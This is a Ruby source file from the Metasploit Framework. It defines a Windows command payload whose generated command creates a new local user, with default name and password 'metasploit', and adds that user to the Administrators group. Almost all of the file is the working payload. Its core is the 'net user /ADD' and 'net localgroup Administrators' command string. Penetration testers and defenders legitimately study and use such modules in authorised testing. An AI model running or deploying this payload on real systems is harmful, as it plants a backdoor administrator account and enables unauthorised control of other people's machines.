# $Id$

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit3

	include Msf::Payload::Single
	include Msf::Sessions::CommandShellOptions

	def initialize(info = {})
		super(merge_info(info,
			'Name'        => 'Windows Execute net user /ADD CMD',
			'Version'     => '$Revision$',
			'Description' => 'Create a new user and add them to local administration group',
			'Author'      => ['hdm','scriptjunkie'],
			'License'     => MSF_LICENSE,
			'Platform'    => 'win',
			'Arch'        => ARCH_CMD,
			'Handler'     => Msf::Handler::None,
			'Session'     => Msf::Sessions::CommandShell,
			'PayloadType' => 'cmd',
			'Payload'     =>
				{
					'Offsets' => { },
					'Payload' => ''
				}
			))

		register_options(
			[
				OptString.new('USER', [ true, "The username to create",     "metasploit" ]),
				OptString.new('PASS', [ true, "The password for this user", "metasploit" ]),
			], self.class)
	end

	def generate
		return super + command_string
	end

	def command_string
		user = datastore['USER'] || 'metasploit'
		pass = datastore['PASS'] || ''

		if(pass.length > 14)
			raise ArgumentError, "Password for the adduser payload must be 14 characters or less"
		end

		return "cmd.exe /c net user #{user} #{pass} /ADD && " +
			"net localgroup Administrators #{user} /ADD"
	end
end
